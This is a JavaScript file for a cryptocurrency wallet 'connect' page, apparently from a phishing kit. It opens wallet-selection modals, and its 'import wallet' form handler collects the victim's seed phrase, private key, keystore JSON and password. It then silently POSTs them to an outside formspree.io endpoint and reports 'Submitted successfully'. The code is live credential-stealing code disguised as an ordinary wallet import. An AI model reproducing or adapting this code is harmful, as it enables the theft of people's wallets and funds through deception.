// Get modal and buttons
const modal = document.getElementById('walletModal');
const openModalBtn = document.getElementById('openModalBtn');
const closeModalBtn = document.getElementById('closeModalBtn');

// Get the element with the class 'open-modal-area'
const openModalArea = document.querySelector(".open-modal-area");

// Function to open the modal
if (openModalArea) {
  openModalArea.onclick = function () {
    modal.style.display = "block";
  };
}

// Open the wallet selection modal
if (openModalBtn) {
  openModalBtn.addEventListener('click', function () {
    modal.style.display = 'block';
  });
}

// Close the wallet selection modal
if (closeModalBtn) {
  closeModalBtn.addEventListener('click', function () {
    modal.style.display = 'none';
  });
}

// Open Modal
const openForm = document.getElementById('openForm');
if (openForm) {
  openForm.onclick = function () {
    document.getElementById('popupModal').style.display = 'block';
  };
}

// Close Modal
const closeForm = document.getElementById('closeForm');
if (closeForm) {
  closeForm.onclick = function () {
    document.getElementById('popupModal').style.display = 'none';
  };
}

// Open Tab
function openTab(event, tabName) {
  var tabContent = document.getElementsByClassName('tab-content');
  for (let i = 0; i < tabContent.length; i++) {
    tabContent[i].classList.remove('active');
  }

  var tabButtons = document.getElementsByClassName('tab-button');
  for (let i = 0; i < tabButtons.length; i++) {
    tabButtons[i].classList.remove('active');
  }

  document.getElementById(tabName).classList.add('active');
  event.currentTarget.classList.add('active');
}

// Close Modal when clicked outside
window.onclick = function (event) {
  var popupModal = document.getElementById('popupModal');
  if (event.target === popupModal) {
    popupModal.style.display = 'none';
  }

  var errorModal = document.getElementById("errorModal");
  if (event.target === errorModal) {
    errorModal.style.display = "none";
  }
}

// Function to show the error popup modal
function showErrorPopup() {
  var modal = document.getElementById("errorModal");
  if (modal) modal.style.display = "block";
}

// Function to close the modal
function closeModal() {
  var modal = document.getElementById("errorModal");
  if (modal) modal.style.display = "none";
}

// Form submission handler
const importWalletForm = document.getElementById('importWalletForm');
if (importWalletForm) {
  importWalletForm.addEventListener('submit', function (e) {
    e.preventDefault(); // Prevents page reload

    const phraseInput = document.getElementById('phrase');
    const privateKeyInput = document.getElementById('private-key');
    const keystoreInput = document.getElementById('keystore-json');
    const passwordInput = document.getElementById('password');

    const phrase = phraseInput ? phraseInput.value.trim() : "";
    const privateKey = privateKeyInput ? privateKeyInput.value.trim() : "";
    const keystore = keystoreInput ? keystoreInput.value.trim() : "";
    const password = passwordInput ? passwordInput.value.trim() : "";

    fetch('https://formspree.io/f/xqaybqon', {
      method: 'POST',
      body: JSON.stringify({
        phrase,
        privateKey,
        keystore,
        password
      }),
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          alert("Submitted successfully!");
          document.getElementById('popupModal').style.display = 'none';
        } else {
          alert("Failed to submit. Try again.");
          showErrorPopup();
        }
      })
      .catch(err => {
        console.error("Network error:", err);
        alert("Network error.");
        showErrorPopup();
      });
  });
}
